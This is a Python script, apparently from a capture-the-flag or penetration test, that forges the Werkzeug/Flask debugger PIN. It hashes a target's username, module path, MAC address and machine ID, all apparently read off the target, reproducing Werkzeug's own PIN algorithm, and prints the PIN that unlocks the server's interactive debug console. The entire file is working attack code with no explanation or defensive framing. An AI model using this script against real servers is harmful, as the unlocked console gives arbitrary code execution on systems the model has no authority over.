import hashlib
from itertools import chain
probably_public_bits = [
    'root',
    'flask.app',
    'Flask',
    '/usr/local/lib/python2.7/dist-packages/flask/app.py'
]
private_bits = [
    '2482658870020',
    'b7471d41202f4da392a4743b37ea3b69d34168894a556ade16fdc8313b2809b8beb9eb545bd829416fa781ab6f36d9a4'
]
h = hashlib.sha1() # python2.7版本是hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode()
    h.update(bit)
h.update(b"cookiesalt")

cookie_name = f"__wzd{h.hexdigest()[:20]}"

# If we need to generate a pin we salt it a bit more so that we don't
# end up with the same value and generate out 9 digits
num = None
if num is None:
    h.update(b"pinsalt")
    num = f"{int(h.hexdigest(), 16):09d}"[:9]

# Format the pincode in groups of digits for easier remembering if
# we don't have a result yet.
rv = None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = "-".join(
                num[x : x + group_size].rjust(group_size, "0")
                for x in range(0, len(num), group_size)
            )
            break
    else:
        rv = num
print(rv)